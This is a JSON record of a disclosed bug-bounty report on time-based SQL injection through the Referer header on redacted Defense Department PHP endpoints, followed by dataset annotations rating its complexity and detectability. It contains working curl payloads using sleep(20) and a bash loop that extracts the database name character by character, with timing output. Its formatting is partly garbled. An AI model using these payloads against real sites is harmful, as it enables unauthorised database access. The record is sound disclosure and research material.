{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "polygon35 ",
  "title": "[\u2588\u2588\u2588\u2588] SQL Injections on Referer Header exploitable via Time-Based method",
  "content": "\nSummary:\nSQL Injections on Referer Header exploitable via Time-Based method\nDescription:\nhttps://owasp.org/www-community/attacks/SQL_Injection\n## Impact\nhttps://owasp.org/www-community/attacks/SQL_Injection\n## Step-by-step Reproduction Instructions\nFirst, vulnerable points:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588/library.php?alert=\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Chart01.php?alert=\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588/Chart02.php?alert=\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Chart03.php?alert=\nhttps://\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588Prod.php?alert=\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588systems.php?alert=\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588db.php?alert=\n(Don't miss the alert GET parameter...)\nOkay, let's check the SQLi... lets use time and curl with a true condition (1=1), if 1=1, then, the server sleep 20 seconds else nothing (I just wrote false to make it explicit for you):\ntime curl -s -H \"Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\" --url \"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588/Chart01.php?alert=\"\nOkay..then.. let's check the response:\nCode 794 Bytes\n1real\t0m21,447s\n2user\t0m0,029s\n3sys\t0m0,000s```\n4\n5The time is 21 seconds.. then.. let's update the if condition as false (1=2)\n6\n7```time curl -s -H \"Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\" --url \"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/Chart01.php?alert=\" ```\n8\n9Response:\n10\n11```Thank you - you may close this window\n12real\t0m1,806s\n13user\t0m0,016s\n14sys\t0m0,008s```\n15\n16Hmm.. approx 2 seconds.. we have proof that's vuln.. let's try more..\n17I want the first character of the current database name..\n18let's go for it!:\n19\n20```for i in {{a..z},{1..9}}; do echo \"Testing $i char:\"; time curl -s -H \"Referer: '+(select*from(select(if(substring(database(),1,1)='$i',sleep(20),false)))a)+'\" --url \"https://\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588/Chart01.php?alert=\"; done```\n21\n22And there are only one-second answers from time except for the m!\n23\nTesting l char:\nThank you - you may close this window\nreal 0m1,321s\nuser 0m0,028s\nsys 0m0,000s\nTesting m char:\nThank you - you may close this window\nreal 0m21,299s\nuser 0m0,019s\nsys 0m0,010s\nTesting n char:\nThank you - you may close this window\nreal 0m1,331s\nuser 0m0,016s\nsys 0m0,012s\nCode 215 Bytes\n1\n2Thanks for reading!\n3\n4There is one of these injection points that is supposedly fixed at report #995122 (report disclosed, resolved.. but it's not..)\n5\n6## Impact\n7\n8https://owasp.org/www-community/attacks/SQL_Injection\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1604371200,
  "report_url": "https://hackerone.com/reports/1018621",
  "vuln_category": "WEB_APP",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "steps": [
    [
      1,
      "Identify vulnerable endpoints by checking the Referer header in HTTP requests to URLs like https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588/Chart01.php?alert="
    ],
    [
      2,
      "Use time-based SQL injection via the Referer header with a payload like: '+(select*from(select(if(1=1,sleep(20),false)))a)+'"
    ],
    [
      3,
      "Observe the response time; a delay indicates a successful injection (e.g., 21 seconds for true condition, 2 seconds for false)"
    ],
    [
      4,
      "Extract database information by modifying the payload to test conditions like substring(database(),1,1)='m'"
    ]
  ],
  "vuln_description": "The vulnerability is a time-based SQL injection in the Referer header of several endpoints. Attackers can manipulate the Referer header to execute arbitrary SQL commands, allowing them to extract database information by observing response delays.",
  "reason": "The attack involves a straightforward exploitation of a common vulnerability (SQL injection) using a well-documented technique (time-based). The steps are linear and do not require complex application state manipulation or novel logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "995122",
  "injection_metadata": {
    "reasoning": "The SQL injection described in the report uses a time-based payload in the Referer header. The proposed methodology includes logging all HTTP requests (including headers like Referer) and testing parameters with simple payloads. Time-based payloads like `sleep(20)` are considered 'simple' as they require no filter bypass and detection is performed via response timing analysis (same channel). The payload execution is observed directly in the HTTP response timing, which aligns with the methodology's 'same channel' requirement.",
    "is_simple_injection": true
  },
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability described involves manipulating the Referer header to perform time-based SQL injection attacks. This is not directly related to authentication or authorization bypass (AuthN/AuthZ) or Insecure Direct Object Reference (IDOR) vulnerabilities. The methodology described focuses on swapping user sessions, actions, and resource IDs to test for AuthN/AuthZ and IDOR vulnerabilities, which does not apply to SQL injection vulnerabilities that exploit input validation flaws in HTTP headers.",
    "is_detectable": false
  }
}